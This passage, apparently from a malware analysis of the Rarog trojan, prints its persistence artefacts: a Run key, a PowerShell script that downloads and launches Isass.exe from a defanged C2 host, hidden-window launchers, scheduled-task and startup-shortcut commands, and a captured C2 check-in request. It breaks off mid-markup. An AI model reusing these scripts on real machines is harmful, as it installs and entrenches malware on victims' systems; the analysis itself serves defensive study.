		<div id="crayon-676268260c9c4467823372" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows_Antimalware_Host_Syst - C:\ProgramData\MicrosoftCorporation\Windows\System32\Isass.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9c4467823372-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9c4467823372-1"><span class="crayon-i">HKCU</span><span class="crayon-sy">\</span><span class="crayon-i">Software</span><span class="crayon-sy">\</span><span class="crayon-i">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-i">Windows</span><span class="crayon-sy">\</span><span class="crayon-i">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-i">Run</span><span class="crayon-sy">\</span><span class="crayon-i">Windows_Antimalware_Host_Syst</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-i">C</span><span class="crayon-sy">:</span><span class="crayon-sy">\</span><span class="crayon-i">ProgramData</span><span class="crayon-sy">\</span><span class="crayon-i">MicrosoftCorporation</span><span class="crayon-sy">\</span><span class="crayon-i">Windows</span><span class="crayon-sy">\</span><span class="crayon-i">System32</span><span class="crayon-sy">\</span><span class="crayon-i">Isass</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The following hidden directory is created, and the following three files are written to this location:<br />
C:\ProgramData\WindowsAppCertification\WindowHelperStorageHostSystemThread.ps1<br />
C:\ProgramData\WindowsAppCertification\cert.cmd<br />
C:\ProgramData\WindowsAppCertification\checker.vbs<br />
The contents of WindowHelperStorageHostSystemThread.ps1 is as follows:<br />
&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9c5756692520" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$path = 'C:\ProgramData\MicrosoftCorporation\Windows\System32\'
$fpath = $path + 'Isass.exe'
$furl = 'http://api.polotreck[.]xyz/2.0/method/update'
$isfile = Test-Path $fpath
if($isfile -eq 'True') {}
else{
New-Item -ItemType directory -Path $path
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($furl,$fpath)
Start-Process -FilePath $fpath}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9c5756692520-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c5756692520-2">2</div><div class="crayon-num" data-line="crayon-676268260c9c5756692520-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c5756692520-4">4</div><div class="crayon-num" data-line="crayon-676268260c9c5756692520-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c5756692520-6">6</div><div class="crayon-num" data-line="crayon-676268260c9c5756692520-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c5756692520-8">8</div><div class="crayon-num" data-line="crayon-676268260c9c5756692520-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c5756692520-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9c5756692520-1"><span class="crayon-sy">$</span><span class="crayon-i">path</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">'C:\ProgramData\MicrosoftCorporation\Windows\System32\'</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c5756692520-2"><span class="crayon-s">$fpath = $path + '</span><span class="crayon-i">Isass</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">'</span></div><div class="crayon-line" id="crayon-676268260c9c5756692520-3"><span class="crayon-s">$furl = '</span><span class="crayon-i">http</span><span class="crayon-sy">:</span><span class="crayon-c">//api.polotreck[.]xyz/2.0/method/update'</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c5756692520-4"><span class="crayon-sy">$</span><span class="crayon-i">isfile</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">Test</span>-<span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-e">fpath</span></div><div class="crayon-line" id="crayon-676268260c9c5756692520-5"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">isfile</span><span class="crayon-h"> </span>-<span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-s">'True'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c5756692520-6"><span class="crayon-st">else</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676268260c9c5756692520-7"><span class="crayon-r">New</span>-<span class="crayon-i">Item</span><span class="crayon-h"> </span>-<span class="crayon-e">ItemType </span><span class="crayon-i">directory</span><span class="crayon-h"> </span>-<span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">path</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c5756692520-8"><span class="crayon-sy">$</span><span class="crayon-i">WebClient</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">New</span>-<span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-i">System</span><span class="crayon-sy">.</span><span class="crayon-i">Net</span><span class="crayon-sy">.</span><span class="crayon-i">WebClient</span></div><div class="crayon-line" id="crayon-676268260c9c5756692520-9"><span class="crayon-sy">$</span><span class="crayon-i">WebClient</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">furl</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">fpath</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c5756692520-10"><span class="crayon-i">Start</span>-<span class="crayon-i">Process</span><span class="crayon-h"> </span>-<span class="crayon-i">FilePath</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">fpath</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The contents of cert.cmd is as follows:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9c7784034178" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoP -file C:\ProgramData\WindowsAppCertification\WindowHelperStorageHostSystemThread.ps1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9c7784034178-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c7784034178-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9c7784034178-1"><span class="crayon-sy">@</span><span class="crayon-e">echo </span><span class="crayon-e">off</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c7784034178-2"><span class="crayon-i">powershell</span><span class="crayon-h"> </span>-<span class="crayon-e">WindowStyle </span><span class="crayon-i">Hidden</span><span class="crayon-h"> </span>-<span class="crayon-e">ExecutionPolicy </span><span class="crayon-i">Bypass</span><span class="crayon-h"> </span>-<span class="crayon-i">NoP</span><span class="crayon-h"> </span>-<span class="crayon-i">file</span><span class="crayon-h"> </span><span class="crayon-i">C</span><span class="crayon-sy">:</span><span class="crayon-sy">\</span><span class="crayon-i">ProgramData</span><span class="crayon-sy">\</span><span class="crayon-i">WindowsAppCertification</span><span class="crayon-sy">\</span><span class="crayon-i">WindowHelperStorageHostSystemThread</span><span class="crayon-sy">.</span><span class="crayon-i">ps1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The contents of checker.vbs is as follows:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9c8621068105" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "C:\ProgramData\WindowsAppCertification\cert.cmd",0</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9c8621068105-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c8621068105-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9c8621068105-1"><span class="crayon-e">Set </span><span class="crayon-i">WshShell</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"WScript.Shell"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c8621068105-2"><span class="crayon-i">WshShell</span><span class="crayon-sy">.</span><span class="crayon-i">Run</span><span class="crayon-h"> </span><span class="crayon-s">"C:\ProgramData\WindowsAppCertification\cert.cmd"</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The following command is executed to create a Scheduled Task to run the checker.vbs script periodically:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9ca589411555" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
schtasks.exe /Create /SC MINUTE /MO 30 /TN "Windows_Antimalware_Host" /TR "C:\ProgramData\WindowsAppCertification\checker.vbs" /F</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9ca589411555-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9ca589411555-1"><span class="crayon-i">schtasks</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span>/<span class="crayon-i">Create</span><span class="crayon-h"> </span>/<span class="crayon-e">SC </span><span class="crayon-i">MINUTE</span><span class="crayon-h"> </span>/<span class="crayon-i">MO</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-h"> </span>/<span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Windows_Antimalware_Host"</span><span class="crayon-h"> </span>/<span class="crayon-i">TR</span><span class="crayon-h"> </span><span class="crayon-s">"C:\ProgramData\WindowsAppCertification\checker.vbs"</span><span class="crayon-h"> </span>/<span class="crayon-i">F</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The following command is executed to create a Scheduled Task to run Isass.exe periodically:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9cb902532865" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
schtasks.exe /Create /SC MINUTE /MO 5 /TN "Windows_Antimalware_Host_Systm" /TR "C:\ProgramData\MicrosoftCorporation\Windows\System32\Isass.exe" /F</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9cb902532865-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9cb902532865-1"><span class="crayon-i">schtasks</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span>/<span class="crayon-i">Create</span><span class="crayon-h"> </span>/<span class="crayon-e">SC </span><span class="crayon-i">MINUTE</span><span class="crayon-h"> </span>/<span class="crayon-i">MO</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-h"> </span>/<span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Windows_Antimalware_Host_Systm"</span><span class="crayon-h"> </span>/<span class="crayon-i">TR</span><span class="crayon-h"> </span><span class="crayon-s">"C:\ProgramData\MicrosoftCorporation\Windows\System32\Isass.exe"</span><span class="crayon-h"> </span>/<span class="crayon-i">F</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>Additionally, the following command is executed to generate a shortcut link in the victim’s startup folder:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9cd941054831" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
cmd.exe /c echo Set oWS = WScript.CreateObject("WScript.Shell") &gt; CreateShortcut.vbs &amp; echo sLinkFile = "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Isass.lnk" &gt;&gt; CreateShortcut.vbs &amp; echo Set oLink = oWS.CreateShortcut(sLinkFile) &gt;&gt; CreateShortcut.vbs &amp; echo oLink.TargetPath = "C:\ProgramData\MicrosoftCorporation\Windows\System32\Isass.exe" &gt;&gt; CreateShortcut.vbs &amp; echo oLink.Save &gt;&gt; CreateShortcut.vbs &amp; cscript CreateShortcut.vbs &amp; del CreateShortcut.vbs</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9cd941054831-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9cd941054831-1"><span class="crayon-i">cmd</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span>/<span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-e">echo </span><span class="crayon-e">Set </span><span class="crayon-i">oWS</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">WScript</span><span class="crayon-sy">.</span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"WScript.Shell"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">CreateShortcut</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-e">echo </span><span class="crayon-i">sLinkFile</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Isass.lnk"</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">CreateShortcut</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-e">echo </span><span class="crayon-e">Set </span><span class="crayon-i">oLink</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">oWS</span><span class="crayon-sy">.</span><span class="crayon-e">CreateShortcut</span><span class="crayon-sy">(</span><span class="crayon-i">sLinkFile</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">CreateShortcut</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-e">echo </span><span class="crayon-i">oLink</span><span class="crayon-sy">.</span><span class="crayon-i">TargetPath</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"C:\ProgramData\MicrosoftCorporation\Windows\System32\Isass.exe"</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">CreateShortcut</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-e">echo </span><span class="crayon-i">oLink</span><span class="crayon-sy">.</span><span class="crayon-i">Save</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">CreateShortcut</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-e">cscript </span><span class="crayon-i">CreateShortcut</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-e">del </span><span class="crayon-i">CreateShortcut</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>These various registry modifications, file modifications, and commands executed provides multiple ways for Rarog to persist on the system both across reboots, as well as in instances where the malware dies or is forcibly closed.<br />
Rarog then makes the following POST request to ensure the ID exists on the remote C2 server:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9ce541929245" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /4.0/method/check HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 6
Host: api.polotreck[.]xyz
id=250
HTTP/1.1 200 OK
Server: nginx/1.13.10
Date: Tue, 20 Mar 2018 20:47:52 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 12
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1
c3VjY2Vzcw==</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
